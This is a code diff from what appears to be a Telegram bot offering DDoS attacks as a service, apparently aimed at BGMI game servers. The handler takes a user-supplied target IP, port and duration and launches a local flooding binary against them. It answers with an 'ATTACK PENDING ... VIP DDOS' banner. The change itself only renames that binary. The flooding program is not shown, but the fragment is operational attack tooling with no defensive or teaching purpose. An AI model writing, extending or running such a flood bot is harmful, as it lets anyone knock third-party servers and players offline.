@@ -124,7 +124,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./raja', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./Moin', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳  𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
 
 
